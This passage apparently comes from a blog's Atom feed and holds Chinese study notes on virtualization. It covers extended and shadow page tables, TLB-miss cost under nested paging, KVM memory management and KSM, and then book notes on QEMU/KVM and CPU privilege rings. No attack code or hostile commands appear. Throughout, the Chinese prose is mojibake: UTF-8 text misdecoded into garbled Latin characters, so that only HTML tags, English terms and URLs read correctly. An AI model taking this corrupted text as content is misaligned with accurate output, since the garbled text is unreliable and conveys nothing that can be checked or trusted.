å°„ã€‚è¿™ç§æ–¹æ³•é€šå¸¸éœ€è¦ç¡¬ä»¶æ”¯æŒï¼Œå¦‚Intelçš„EPTï¼ˆæ‰©å±•é¡µè¡¨ï¼‰æˆ–AMDçš„NPTï¼ˆåµŒå¥—é¡µè¡¨ï¼‰ã€‚</li><li><strong>å½±å­é¡µè¡¨</strong>ï¼šå½±å­é¡µè¡¨æ˜¯ä¸€ç§è½¯ä»¶è¾…åŠ©çš„å†…å­˜è™šæ‹ŸåŒ–æ–¹æ³•ã€‚åœ¨è¿™ç§æ–¹æ³•ä¸­ï¼Œè™šæ‹Ÿæœºç›‘è§†å™¨ï¼ˆä¾‹å¦‚Hypervisorï¼‰ç»´æŠ¤äº†ä¸¤ç»„é¡µè¡¨ç»“æ„ï¼šä¸€ç»„æ˜¯è™šæ‹Ÿæœºçš„é¡µè¡¨ï¼Œç”¨äºè™šæ‹Ÿæœºå†…éƒ¨çš„è™šæ‹Ÿåœ°å€åˆ°è™šæ‹Ÿæœºç‰©ç†åœ°å€çš„æ˜ å°„ï¼Œå¦ä¸€ç»„æ˜¯å½±å­é¡µè¡¨ï¼Œç”¨äºè™šæ‹Ÿæœºç‰©ç†åœ°å€åˆ°çœŸæ­£çš„ä¸»æœºç‰©ç†åœ°å€çš„æ˜ å°„ã€‚è™šæ‹Ÿæœºç›‘è§†å™¨è´Ÿè´£åœ¨è™šæ‹Ÿæœºæ‰§è¡ŒæœŸé—´ä¿æŒè¿™ä¸¤ç»„é¡µè¡¨åŒæ­¥ã€‚</li></ul></blockquote><p>æ‰©å±•é¡µè¡¨ï¼Œä¹Ÿç§°ä¸ºåµŒå¥—é¡µè¡¨ï¼Œæ¶ˆé™¤äº†åŸºäºè½¯ä»¶çš„é˜´å½±åˆ†é¡µçš„éœ€è¦ã€‚è¯¥è®¾è®¡ç”±Bhargavaç­‰äººäº2008å¹´å‘è¡¨ï¼Œå¹¶åœ¨å¤§çº¦åŒä¸€æ—¶é—´ç”±AMDå’Œè‹±ç‰¹å°”æ¨å‡ºèŠ¯ç‰‡æ”¯æŒã€‚æ‰©å±•é¡µè¡¨åœ¨ç¡¬ä»¶ä¸­å°†x86ç»å…¸çš„ç¡¬ä»¶å®šä¹‰çš„é¡µè¡¨ç»“æ„ï¼ˆç”±å®¢æˆ·æ“ä½œç³»ç»Ÿç»´æŠ¤ï¼‰ä¸ç”±è™šæ‹Ÿæœºç›‘æ§ç¨‹åºç»´æŠ¤çš„ç¬¬äºŒé¡µè¡¨ç»“æ„ç›¸ç»“åˆï¼Œè¯¥ç»“æ„æŒ‡å®šäº†å®¢æˆ·ç‰©ç†åˆ°ä¸»æœºç‰©ç†çš„æ˜ å°„ã€‚è¿™ä¸¤ä¸ªç»“æ„éƒ½ä»¥æ ‘çš„å½¢å¼ç»„ç»‡ã€‚</p><p>ä½¿ç”¨æ‰©å±•é¡µè¡¨ï¼Œä¸å¤„ç†å™¨æ·±åº¦é›†æˆçš„TLBæŸ¥æ‰¾é€»è¾‘ä¸ä¼šå‘ç”Ÿæ ¹æœ¬æ€§å˜åŒ–ï¼šTLBä»ç„¶ä»¥é›†åˆå…³è”é«˜é€Ÿç¼“å­˜çš„å½¢å¼å°†è™šæ‹Ÿé¡µæ˜ å°„åˆ°ä¸»æœºç‰©ç†é¡µã€‚åœ¨æ”¯æŒè¶…çº§é¡µï¼ˆä¾‹å¦‚x86-64ä¸Šçš„2 MBå’Œ1 GBï¼‰çš„ä½“ç³»ç»“æ„ä¸Šï¼Œé€šå¸¸ä¸ºæ¯ä¸ªé¡µå¤§å°æœ‰ä¸€ä¸ªä¸åŒçš„é«˜é€Ÿç¼“å­˜ã€‚<br><img src="https://img.gls.show/img/20230905095755.png"></p><p>ä»æ ¹æœ¬ä¸Šæ”¹å˜çš„æ˜¯TLBæœªå‘½ä¸­å¤„ç†é€»è¾‘ã€‚æ¯å½“TLBä¸­ä¸å­˜åœ¨æ˜ å°„æ—¶ï¼Œx86-64æ¶æ„è§„å®šå¤„ç†å™¨å°†éå†ç”±%cr3æ ¹çš„é¡µè¡¨æ ‘ï¼Œå¹¶å°†ç¼ºå¤±çš„æ˜ å°„æ’å…¥åˆ°TLBä¸­ã€‚åœ¨x86-64ä¸Šï¼Œåœ¨æ²¡æœ‰æ‰©å±•åˆ†é¡µçš„æƒ…å†µä¸‹ï¼Œå¯¹äºå¸¸è§„é¡µï¼Œæ ‘æ˜¯ä¸€ä¸ªn=4çº§æ ‘ï¼Œå¯¹äº2 MBé¡µï¼Œæ ‘æ˜¯ä¸€ä¸ªn=3çº§æ ‘ï¼Œå¯¹äº1 GBé¡µï¼Œæ ‘æ˜¯ä¸€ä¸ªn=2çº§æ ‘ã€‚å› æ­¤ï¼Œé¡µé¢éå†é€»è¾‘å¿…é¡»è®¿é—®nä¸ªå†…å­˜ä½ç½®ä»¥æ‰¾åˆ°ç¼ºå¤±çš„æ˜ å°„ã€‚åªæœ‰ç„¶åCPUæ‰èƒ½æ‰§è¡Œå®é™…çš„å†…å­˜è¯»å–æˆ–å†™å…¥ã€‚</p><p>è®©æˆ‘ä»¬è€ƒè™‘ä¸€ä¸‹è™šæ‹Ÿåˆ°å®¢æˆ·ç‰©ç†æ ‘æ˜¯nçº§ï¼Œå®¢æˆ·ç‰©ç†åˆ°ä¸»æœºç‰©ç†æ ‘æ˜¯mçº§çš„æƒ…å†µã€‚å¦‚å›¾5.1æ‰€ç¤ºã€‚åœ¨TLBæœªå‘½ä¸­æ—¶ï¼Œç¡¬ä»¶éå†äº†å®Œå…¨ç”±å®¢æˆ·ç‰©ç†é¡µç»„æˆçš„å®¢æˆ·é¡µè¡¨ç»“æ„ï¼Œè¦æ±‚æ¯ä¸ªå®¢æˆ·ç‰©ç†å¼•ç”¨å¿…é¡»åˆ†åˆ«æ˜ å°„åˆ°è‡ªå·±çš„ä¸»æœºç‰©ç†åœ°å€ã€‚ä¸ºäº†è§£å†³ç¬¬ä¸€æ£µæ ‘ä¸­çš„æ¯ä¸ªå¼•ç”¨ï¼Œå¤„ç†å™¨å¿…é¡»é¦–å…ˆåœ¨ç¬¬äºŒæ£µæ ‘ä¸­æ‰§è¡Œmä¸ªå¼•ç”¨ï¼Œç„¶ååœ¨ç¬¬ä¸€æ£µæ ‘ä¸­æŸ¥æ‰¾æ˜ å°„ã€‚å…±æœ‰nä¸ªè¿™æ ·çš„æ­¥éª¤ï¼Œæ¯ä¸ªæ­¥éª¤éœ€è¦m+1ä¸ªå¼•ç”¨ã€‚è¿™nx(m+1)ä¸ªå¼•ç”¨å¯¼è‡´æ‰€éœ€çš„å®¢æˆ·ç‰©ç†åœ°å€ã€‚è¿˜éœ€è¦mä¸ªæŸ¥æ‰¾æ¥å°†æ­¤å®¢æˆ·ç‰©ç†åœ°å€è½¬æ¢ä¸ºä¸»æœºç‰©ç†åœ°å€ã€‚å› æ­¤ï¼Œè¿›è¡Œæ‰©å±•é¡µæŸ¥æ‰¾æ‰€éœ€çš„æ¶æ„å®šä¹‰çš„å†…å­˜å¼•ç”¨æ¬¡æ•°ä¸ºnxm+n+mã€‚</p><p>æ€»ä¹‹ï¼Œæ‰©å±•åˆ†é¡µé€šè¿‡äºŒæ¬¡æŸ¥æ‰¾ç®—æ³•ç»„åˆäº†ä¸¤ä¸ªç‹¬ç«‹çš„æ˜ å°„ã€‚å°½ç®¡åœ¨æ¶æ„ä¸Šæ˜¯äºŒæ¬¡çš„ï¼Œä½†å½“å‰ä¸€ä»£å¤„ç†å™¨å¹¿æ³›ä¾èµ–äºè¾…åŠ©æ•°æ®ç»“æ„æ¥å‡å°‘å¯¹å†…å­˜å±‚æ¬¡ç»“æ„çš„å®é™…å¼•ç”¨æ¬¡æ•°ã€‚</p><h2 id="5-2-è™šæ‹ŸåŒ–-KVM-å†…å­˜"><a href="#5-2-è™šæ‹ŸåŒ–-KVM-å†…å­˜" class="headerlink" title="5.2 è™šæ‹ŸåŒ– KVM å†…å­˜"></a>5.2 è™šæ‹ŸåŒ– KVM å†…å­˜</h2><p>KVMæœ€åˆåœ¨å¼•å…¥æ‰©å±•åˆ†é¡µä¹‹å‰å‘å¸ƒã€‚å› æ­¤ï¼ŒKVMå†…æ ¸æ¨¡å—å¯ä»¥é…ç½®ä¸ºå¯ç”¨æˆ–ç¦ç”¨è¯¥åŠŸèƒ½[42]ã€‚ç„¶è€Œï¼Œåœ¨å®è·µä¸­ï¼Œè€ƒè™‘åˆ°å½“å‰ï¼ˆ2017å¹´ï¼‰ä½¿ç”¨KVMçš„æƒ…å†µæ—¶ï¼Œä¸ä½¿ç”¨æ‰©å±•åˆ†é¡µçš„æƒ…å†µä»…é™äºåµŒå¥—è™šæ‹ŸåŒ–çš„æƒ…å†µï¼Œä¾‹å¦‚Turtlesç ”ç©¶åŸå‹[33]ã€‚</p><p>å›¾5.2æ˜¾ç¤ºäº†KVMä¸­å†…å­˜ç®¡ç†çš„å…³é”®æ–¹é¢ã€‚è¯¥å›¾æ˜¾ç¤ºäº†ä¸‰ä¸ªä¸åŒçš„é¡µè¡¨ç»“æ„ï¼Œç”±ä¸åŒçš„å®ä½“ç®¡ç†ï¼ˆä»¥çº¢ç‚¹è¡¨ç¤ºï¼‰ã€‚</p><ul><li>ä½œä¸ºç”¨æˆ·ç©ºé—´è¿›ç¨‹ï¼ŒQEMUåœ¨å…¶è‡ªå·±çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„ä¸€ä¸ªè¿ç»­éƒ¨åˆ†ä¸­åˆ†é…è™šæ‹Ÿæœºç‰©ç†å†…å­˜ã€‚è¿™æ ·åšæœ‰å‡ ä¸ªåŸå› ï¼šï¼ˆiï¼‰å®ƒå°†å†…å­˜ç®¡ç†å’Œåˆ†é…çš„ç»†èŠ‚äº¤ç»™äº†ä¸»æœºæ“ä½œç³»ç»Ÿï¼Œç¬¦åˆç±»å‹2æ¶æ„çš„åŸåˆ™ï¼›ï¼ˆiiï¼‰å®ƒæ–¹ä¾¿ç”¨æˆ·ç©ºé—´è®¿é—®è™šæ‹Ÿæœºç‰©ç†åœ°å€ç©ºé—´ï¼›è¿™åœ¨ç‰¹å®šæƒ…å†µä¸‹ç”±æ¨¡æ‹Ÿè®¾å¤‡ä½¿ç”¨ï¼Œè¿™äº›è®¾å¤‡æ‰§è¡Œå¯¹è™šæ‹Ÿæœºç‰©ç†å†…å­˜çš„DMAè¯»å†™æ“ä½œã€‚åƒæœºå™¨ä¸Šçš„ä»»ä½•è¿›ç¨‹ä¸€æ ·ï¼ŒLinuxç®¡ç†è¯¥è¿›ç¨‹çš„é¡µè¡¨æ ‘ã€‚å½“QEMUè¿›ç¨‹è¢«è°ƒåº¦æ—¶ï¼ˆåŒ…æ‹¬è™šæ‹Ÿæœºçš„VCPUæ­£åœ¨è¿è¡Œçš„æ‰€æœ‰æƒ…å†µï¼‰ï¼Œæ ¹æ¨¡å¼çš„%cr3å¯„å­˜å™¨å®šä¹‰äº†ä¸€ä¸ªåœ°å€ç©ºé—´ï¼Œå…¶ä¸­åŒ…æ‹¬QEMUå’Œè¿ç»­çš„è™šæ‹Ÿæœºç‰©ç†å†…å­˜ã€‚</li><li>è™šæ‹Ÿæœºç®¡ç†å…¶è‡ªå·±çš„é¡µè¡¨ã€‚å¯ç”¨åµŒå¥—åˆ†é¡µåï¼Œéæ ¹æ¨¡å¼çš„cr3å¯„å­˜å™¨æŒ‡å‘å®¢æˆ·é¡µè¡¨ï¼Œè¿™å®šä¹‰äº†å½“å‰çš„åœ°å€ç©ºé—´ä»¥è™šæ‹Ÿæœºç‰©ç†å†…å­˜ä¸ºåŸºç¡€ã€‚è¿™å®Œå…¨å—åˆ°å®¢æˆ·æ“ä½œç³»ç»Ÿçš„æ§åˆ¶ã€‚æ­¤å¤–ï¼ŒKVMæ— éœ€è·Ÿè¸ªå®¢æˆ·é¡µè¡¨çš„æ›´æ”¹æˆ–ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚å®é™…ä¸Šï¼Œå½“å¯ç”¨è¯¥åŠŸèƒ½æ—¶ï¼Œéæ ¹æ¨¡å¼ä¸­å¯¹cr3çš„åˆ†é…ä¸éœ€è¦å¼•å‘#vmexitã€‚</li><li>åœ¨x86æ¶æ„ä¸­ï¼Œå¸¸è§„é¡µè¡¨çš„æ ¼å¼ï¼ˆç”±cr3å¯„å­˜å™¨æŒ‡å®šï¼‰ä¸åµŒå¥—é¡µè¡¨çš„æ ¼å¼ä¸åŒã€‚å› æ­¤ï¼ŒKVMå†…æ ¸æ¨¡å—è´Ÿè´£ç®¡ç†åµŒå¥—é¡µè¡¨ï¼Œæ ¹æ®Intelæ¶æ„åœ¨eptpå¯„å­˜å™¨ä¸­æŒ‡å®šã€‚</li></ul><p>æˆ‘ä»¬è¿˜åšäº†ä¸€ä¸ªé¢å¤–çš„è§‚å¯Ÿï¼Œå¯¹æ€§èƒ½æœ‰å½±å“ï¼šå¯¹äºè™šæ‹ŸåŒ–ç®¡ç†ç¨‹åºæ¥è¯´ï¼Œè®¿é—®è™šæ‹Ÿæœºç‰©ç†åœ°å€ç©ºé—´æ¯”è®¿é—®è™šæ‹Ÿæœºè™šæ‹Ÿåœ°å€ç©ºé—´æ›´å®¹æ˜“ã€‚ å…·ä½“æ¥è¯´ï¼ŒVT-xæ¶æ„ä¸æä¾›<strong>æ ¹æ¨¡å¼è½¯ä»¶æœ‰æ•ˆè®¿é—®éæ ¹æ¨¡å¼ç¯å¢ƒçš„è™šæ‹Ÿåœ°å€ç©ºé—´</strong>çš„ä½“ç³»ç»“æ„æ”¯æŒã€‚ </p><p><img src="https://img.gls.show/img/20230905142338.png"></p><p>å›¾5.2æ˜¾ç¤ºï¼Œå¯¹äºè™šæ‹ŸåŒ–ç®¡ç†ç¨‹åºæ¥è¯´ï¼Œ<strong>è®¿é—®è™šæ‹Ÿæœºç‰©ç†åœ°å€ç©ºé—´å¾ˆç®€å•</strong>ï¼šç”¨æˆ·ç©ºé—´è¿›ç¨‹å¯ä»¥ç®€å•åœ°<strong>å°†ä¸€ä¸ªå¸¸é‡åç§»é‡æ·»åŠ åˆ°å†…å­˜ä½ç½®çš„å¼•ç”¨</strong>ä¸­ã€‚å®é™…ä¸Šï¼ŒKVMæ¨¡å—æœ¬èº«ä¹Ÿå¯ä»¥ä½¿ç”¨ç›¸åŒçš„æ–¹æ³•ï¼Œå› ä¸ºç”¨æˆ·ç©ºé—´è¿›ç¨‹å·²ç»æ˜ å°„äº†åœ°å€ç©ºé—´ã€‚ç„¶è€Œï¼Œå¯¹äºè™šæ‹ŸåŒ–ç®¡ç†ç¨‹åºæ¥è¯´ï¼Œè¦<strong>è®¿é—®è™šæ‹Ÿæœºçš„è™šæ‹Ÿåœ°å€ç©ºé—´è¦å›°éš¾å¾—å¤šå’Œå¤æ‚å¾—å¤šï¼Œå› ä¸ºè¿™äº›æ˜ å°„åªå­˜åœ¨äºå¤„ç†å™¨çš„å†…å­˜ç®¡ç†å•å…ƒï¼ˆMMUï¼‰ä¸­ï¼Œè€Œè™šæ‹Ÿæœºåœ¨æ‰§è¡Œæ—¶å­˜åœ¨ï¼Œä½†åœ¨è™šæ‹ŸåŒ–ç®¡ç†ç¨‹åºæ‰§è¡Œæ—¶ä¸å­˜åœ¨</strong>ã€‚ ä¸å¹¸çš„æ˜¯ï¼Œå®¢æˆ·æŒ‡ä»¤æŒ‡é’ˆæ˜¯ä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼ŒKVMè§£ç å™¨å¿…é¡»ä»å†…å­˜ä¸­è¯»å–æ•…éšœæŒ‡ä»¤çš„å†…å®¹ã€‚åŒæ ·ï¼ŒæŒ‡ä»¤çš„æ‰€æœ‰å†…å­˜æ“ä½œæ•°éƒ½æ¶‰åŠè™šæ‹Ÿæœºè™šæ‹Ÿåœ°å€çš„å¼•ç”¨ã€‚å› æ­¤ï¼ŒKVMè§£ç å™¨å’Œæ¨¡æ‹Ÿå™¨åœ¨è½¯ä»¶ä¸­é‡å¤å¼•ç”¨å®¢æˆ·é¡µè¡¨ï¼Œä»¥ç¡®å®šæŒ‡ä»¤å’Œæ“ä½œæ•°åœ¨è™šæ‹Ÿæœºç‰©ç†å†…å­˜ä¸­çš„ä½ç½®ã€‚ KVMçš„ç±»å‹2è™šæ‹Ÿæœºç›‘è§†å™¨è®¾è®¡åœ¨ç®¡ç†è™šæ‹Ÿæœºç‰©ç†å†…å­˜æ—¶å¼•å…¥äº†ä¸€ä¸ªå¤æ‚æ€§ã€‚å°½ç®¡æ ¼å¼ä¸åŒï¼Œä½†<strong>åµŒå¥—é¡µè¡¨ä¸­è™šæ‹Ÿæœºç‰©ç†åœ°å€ç©ºé—´çš„è¯­ä¹‰æ˜ å°„å¿…é¡»ä¸ä¸»æœºæ“ä½œç³»ç»Ÿçš„è™šæ‹Ÿæœºç‰©ç†åœ°å€ç©ºé—´çš„æ˜ å°„ä¿æŒä¸€è‡´</strong>ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè™šæ‹Ÿæœºç‰©ç†æ˜ å°„å‘ç”Ÿå˜åŒ–ï¼Œä¾‹å¦‚ï¼Œåœ¨å¤„ç†è™šæ‹Ÿæœºçš„#vmexitæ—¶åˆ†é…äº†æ–°é¡µé¢ï¼Œé‚£ä¹ˆç›¸åŒçš„æ˜ å°„ä¹Ÿå¿…é¡»åæ˜ åœ¨ä¸»æœºä¸Šçš„QEMUè¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­ã€‚åä¹‹ï¼Œå¦‚æœä¸»æœºæ“ä½œç³»ç»Ÿå†³å®šä»QEMUè¿›ç¨‹ä¸­äº¤æ¢å‡ºä¸€ä¸ªé¡µé¢ï¼Œåˆ™è¿˜å¿…é¡»åˆ é™¤ç›¸åº”çš„è™šæ‹Ÿæœºç‰©ç†æ‰©å±•æ˜ å°„ã€‚ </p><p>å½“å‰ç‰ˆæœ¬çš„KVMåœ¨å†…å­˜ç®¡ç†é¢†åŸŸåŒ…å«äº†ä¸€äº›å…³é”®çš„ä¼˜åŒ–ã€‚ç‰¹åˆ«æ˜¯ï¼ŒLinuxçš„KSMæœºåˆ¶å…è®¸å†…å­˜çš„é€æ˜å…±äº«ï¼Œç±»ä¼¼äºVMware ESX Serverä¸­å¼•å…¥çš„è§£å†³æ–¹æ¡ˆã€‚KSMå…è®¸å…·æœ‰ç›¸åŒå†…å®¹çš„å†…å­˜é¡µé¢åœ¨Linuxè¿›ç¨‹ä¹‹é—´ä»¥åŠKVMè™šæ‹Ÿæœºä¹‹é—´è¿›è¡Œé€æ˜å…±äº«ã€‚å½“å‘ç°ä¸¤ä¸ªå±äºæ½œåœ¨ä¸åŒè¿›ç¨‹çš„ä¸åŒé¡µé¢å…·æœ‰ç›¸åŒçš„å†…å®¹ï¼Œå¹¶ä¸”è¯¥å†…å®¹è¢«å£°æ˜ä¸ºç¨³å®šï¼Œå³åœ¨ä¸ä¹…çš„å°†æ¥ä¸å¤ªå¯èƒ½æ›´æ”¹æ—¶ï¼Œå°†æ£€æµ‹åˆ°åŒ¹é…ã€‚ç„¶åï¼ŒKSMæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼šï¼ˆiï¼‰ä»è¯¥é›†åˆä¸­é€‰æ‹©ä¸€ä¸ªé¡µé¢ï¼›ï¼ˆiiï¼‰åœ¨æ‰€æœ‰åœ°å€ç©ºé—´ä¸­ä¸ºè¯¥é¡µé¢å»ºç«‹åªè¯»æ˜ å°„ï¼›ï¼ˆiiiï¼‰é€šçŸ¥KVMæ¨¡å—æ‰§è¡Œç›¸åŒçš„æ“ä½œä»¥å¤„ç†åµŒå¥—é¡µè¡¨ï¼›ä»¥åŠï¼ˆivï¼‰é‡Šæ”¾æ‰€æœ‰å…¶ä»–ç›¸åŒé¡µé¢çš„å‰¯æœ¬ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€Šqemu kvmæºç è§£æä¸åº”ç”¨ã€‹å­¦ä¹ ç¬”è®°</title>
    <link href="/p/c9034472/"/>
    <url>/p/c9034472/</url>
    
    <content type="html"><![CDATA[<p>David Wheeleræœ‰ä¸€å¥åè¨€ï¼šâ€œè®¡ç®—æœºç§‘å­¦ä¸­çš„ä»»ä½•é—®é¢˜ éƒ½å¯ä»¥é€šè¿‡å¢åŠ ä¸€ä¸ªä¸­é—´å±‚æ¥è§£å†³ã€‚â€</p><ul><li>æ•°å­—é€»è¾‘ç”µè·¯-ã€‹æ±‡ç¼–-ã€‹Cè¯­è¨€ã€‚ä»æœºå™¨ç ã€æ±‡ç¼–è¯­è¨€åˆ°Cè¯­è¨€ï¼Œå† åˆ°é«˜çº§è¯­è¨€ï¼Œå…¶æœ¬è´¨å°±æ˜¯ä¸€ä¸ªä¸æ–­è™šæ‹Ÿçš„è¿‡ç¨‹ï¼Œå°†åº•å±‚å¤æ‚çš„æ¥å£è½¬å˜æˆäº†ä¸Šå±‚å®¹æ˜“ä½¿ç”¨çš„æ¥å£ã€‚</li><li>ç¡¬ç›˜ç”±æŸ±é¢ã€ç£é“ã€æ‰‡åŒºæ„æˆã€‚åº”ç”¨ç¨‹åºèƒ½å¤Ÿé€šè¿‡æ–‡ä»¶ç®¡ç†çš„æ¥å£æ–¹ä¾¿åœ°åˆ›å»ºã€è¯»å–ã€å†™å…¥æ–‡ä»¶</li><li>TCP/IPåè®®æ ˆæ¨¡å‹ã€‚ç»è¿‡ç½‘ç»œå±‚ã€ä¼ è¾“å±‚çš„æŠ½è±¡ä¹‹åï¼Œåº”ç”¨ç¨‹åºä¸éœ€è¦ç›´æ¥è·Ÿç½‘ç»œæ•°æ®åŒ…çš„æ”¶å‘ç»†èŠ‚æ‰“äº¤é“</li><li>æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æ˜¯å¯¹è®¡ç®—æœºçš„æŠ½è±¡ï¼Œè¿›ç¨‹éƒ½è®¤ä¸ºè‡ªå·±ç‹¬å æ•´ä¸ªè®¡ç®—æœºç³»ç»Ÿçš„èµ„æºï¼Œæœ‰ç€ç‹¬ç«‹çš„CPUå’Œå†…å­˜</li></ul><p>è™šæ‹Ÿæœºï¼ˆVirtualMachineï¼ŒVMï¼‰</p><ul><li>æœ€ç®€å•çš„è™šæ‹Ÿæœºæ˜¯è¿›ç¨‹ã€‚è¿›ç¨‹å¯ä»¥çœ‹ä½œæ˜¯ä¸€ç»„èµ„æºçš„é›†åˆï¼Œæœ‰è‡ªå·±ç‹¬ç«‹çš„è¿›ç¨‹åœ°å€ç©ºé—´ä»¥åŠç‹¬ç«‹çš„CPUå’Œå¯„å­˜å™¨ã€‚ä¸€ä¸ªè¿›ç¨‹åœ¨æ‰§è¡ŒæŒ‡ä»¤ã€è®¿é—®å†…å­˜çš„æ—¶å€™å¹¶ä¸ä¼šå½±å“å…¶ä»–è¿›ç¨‹ã€‚</li><li>æ¨¡æ‹Ÿå™¨æ˜¯å¦ä¸€ç§å½¢å¼çš„è™šæ‹Ÿæœºã€‚å®ƒå¯ä»¥ä½¿ä¸ºä¸€ç§ç¡¬ä»¶æŒ‡ä»¤é›†ï¼ˆInstruction Set Architectureï¼ŒISAï¼‰ç¼–è¯‘çš„ç¨‹åºè¿è¡Œåœ¨å¦ä¸€ç§ç¡¬ä»¶æŒ‡ä»¤é›†ä¸Šã€‚æ¨¡æ‹Ÿå™¨å¯ä»¥é€šè¿‡è§£é‡Šæ¥å®ç°ï¼Œå³å¯¹ç¨‹åºçš„æºISAæŒ‡ä»¤ä¸€æ¡ä¸€æ¡è¿›è¡Œåˆ†æï¼Œç„¶åæ‰§è¡Œç›¸åº”çš„ISAæŒ‡ä»¤ä¸Šçš„æ“ä½œã€‚æ¨¡æ‹Ÿå™¨ä¹Ÿå¯ä»¥é€šè¿‡äºŒè¿›åˆ¶ç¿»è¯‘å®ç°ï¼Œå³é¦–å…ˆå°†ç¨‹åºä¸­æ‰€æœ‰çš„æºISAæŒ‡ä»¤ç¿»è¯‘æˆç›®æ ‡ISAä¸Šå…·æœ‰åŒæ ·åŠŸèƒ½çš„æŒ‡ä»¤ï¼Œç„¶ååœ¨ç›®æ ‡ISAæŒ‡ä»¤æœºå™¨ä¸Šæ‰§è¡Œã€‚</li></ul><p>ç®¡ç†å…¨å±€ç‰©ç†èµ„æºçš„è½¯ ä»¶å«ä½œè™šæ‹Ÿæœºç›‘æ§å™¨ï¼ˆVirtual Machine Monitorï¼ŒVMMï¼‰ï¼ŒVMMä¹‹äºè™šæ‹Ÿæœº å°±å¦‚åŒæ“ä½œç³»ç»Ÿä¹‹äºè¿›ç¨‹ï¼ŒVMMåˆ©ç”¨æ—¶åˆ†å¤ç”¨æˆ–è€…ç©ºåˆ†å¤ç”¨çš„åŠæ³•å°†ç¡¬ä»¶èµ„ æºåœ¨å„ä¸ªè™šæ‹Ÿæœºä¹‹é—´è¿›è¡Œåˆ†é…</p><p>ç³»ç»Ÿè™šæ‹ŸåŒ–æ¨¡æ‹ŸæŒ‡çš„æ˜¯QEMUèƒ½å¤Ÿæ¨¡æ‹Ÿä¸€ä¸ªå®Œæ•´çš„ç³»ç»Ÿè™šæ‹Ÿæœºï¼Œè¯¥è™šæ‹Ÿæœºæœ‰è‡ªå·±çš„è™šæ‹Ÿ CPUã€èŠ¯ç‰‡ç»„ã€è™šæ‹Ÿå†…å­˜ä»¥åŠå„ç§è™šæ‹Ÿå¤–éƒ¨è®¾å¤‡ï¼Œèƒ½å¤Ÿä¸ºè™šæ‹Ÿæœºä¸­è¿è¡Œçš„æ“ä½œç³»ç»Ÿå’Œåº”ç”¨è½¯ä»¶å‘ˆç°å‡ºä¸ç‰©ç†è®¡ç®—æœºå®Œå…¨ä¸€è‡´çš„ç¡¬ä»¶è§†å›¾ã€‚</p><p>æ—©æœŸçš„QEMUéƒ½æ˜¯è½¯ä»¶æ¨¡æ‹Ÿçš„ï¼Œå¾ˆæ˜æ˜¾å…¶åœ¨æ€§èƒ½ä¸Šæ˜¯ä¸èƒ½æ»¡è¶³è¦æ±‚çš„ã€‚æ‰€ä»¥æ—©æœŸçš„äº‘è®¡ç®—å¹³å°é€šå¸¸ä½¿ç”¨ Xenä½œä¸ºå…¶åº•å±‚è™šæ‹ŸåŒ–å¹³å°ã€‚å‰é¢æåˆ°è¿‡ï¼ŒXenæ—©æœŸæ˜¯åœ¨x86æ¶æ„ä¸Šç›´æ¥å®Œæˆ çš„è™šæ‹ŸåŒ–ï¼Œè¿™éœ€è¦ä¿®æ”¹è™šæ‹Ÿæœºå†…éƒ¨çš„æ“ä½œç³»ç»Ÿï¼Œä¹Ÿä½¿å¾—Xençš„æ•´ä¸ªVMMéå¸¸å¤ æ‚ï¼Œç¼ºé™·æ¯”è¾ƒå¤šã€‚</p><h2 id="4-1-CPUè™šæ‹ŸåŒ–ä»‹ç»"><a href="#4-1-CPUè™šæ‹ŸåŒ–ä»‹ç»" class="headerlink" title="4.1 CPUè™šæ‹ŸåŒ–ä»‹ç»"></a>4.1 CPUè™šæ‹ŸåŒ–ä»‹ç»</h2><h3 id="4-1-1-CPUè™šæ‹ŸåŒ–ç®€ä»‹"><a href="#4-1-1-CPUè™šæ‹ŸåŒ–ç®€ä»‹" class="headerlink" title="4.1.1 CPUè™šæ‹ŸåŒ–ç®€ä»‹"></a>4.1.1 CPUè™šæ‹ŸåŒ–ç®€ä»‹</h3><p>åœ¨ç‰©ç†æœºä¸­ï¼Œæ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºéƒ½æ˜¯ç›´æ¥è¿è¡Œåœ¨ç¡¬ä»¶ä¸Š</p><ul><li>æ“ä½œç³»ç»Ÿçš„ä»£ç è¿è¡Œåœ¨ring0</li><li>åº”ç”¨ç¨‹åºçš„ä»£ç è¿è¡Œåœ¨ring3</li><li>åº”ç”¨ç¨‹åºéœ€è¦æ‰§è¡Œä¸€äº›æ•æ„Ÿæ“ä½œã€è®¿é—®ä¸€äº›ç³»ç»Ÿèµ„æºæ—¶ï¼Œéœ€è¦æ‰§è¡Œç‰¹æ®Šçš„æŒ‡ä»¤é™·å…¥åˆ°æ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œç”±å†…æ ¸è¿›è¡Œä¸€äº›å®‰å…¨æ£€æŸ¥ï¼Œä»£æ›¿åº”ç”¨ç¨‹åºè®¿é—®è¿™äº›èµ„æº</li></ul><p>æŒ‡ä»¤</p><ul><li>èƒ½å¤Ÿåœ¨ring3æ‰§è¡Œçš„æŒ‡ä»¤å«ä½œéç‰¹æƒæŒ‡ä»¤</li><li>åªèƒ½å¤Ÿåœ¨ring0æ‰§è¡Œçš„æŒ‡ä»¤å«ä½œç‰¹æƒæŒ‡ä»¤</li><li>å¦‚æœæŒ‡ä»¤ä¼šå½±å“åˆ°æ•´ä¸ªç³»ç»Ÿï¼Œå«ä½œæ•æ„ŸæŒ‡ä»¤ï¼Œå¦‚æœåªå½±å“è‡ªèº«æ‰€åœ¨çš„è¿›ç¨‹ï¼Œå°±å«ä½œéæ•æ„ŸæŒ‡ä»¤<ul><li>å…¸å‹çš„æ•æ„ŸæŒ‡ä»¤åŒ…æ‹¬è¯»å†™æ—¶é’Ÿã€è¯»å†™ä¸­æ–­å¯„å­˜å™¨ç­‰</li></ul></li></ul><p>å­˜åœ¨ä¸€äº›å±äºæ•æ„ŸæŒ‡ä»¤ä½†ä¸æ˜¯ç‰¹æƒæŒ‡ä»¤çš„æŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯è¯´ç”¨æˆ·ç¨‹åºèƒ½å¤Ÿè¿è¡Œä¸€äº›å¯ä»¥æ”¹å˜/è·å–å…¨å±€èµ„æºçš„æŒ‡ä»¤ï¼Œè¿™é€ 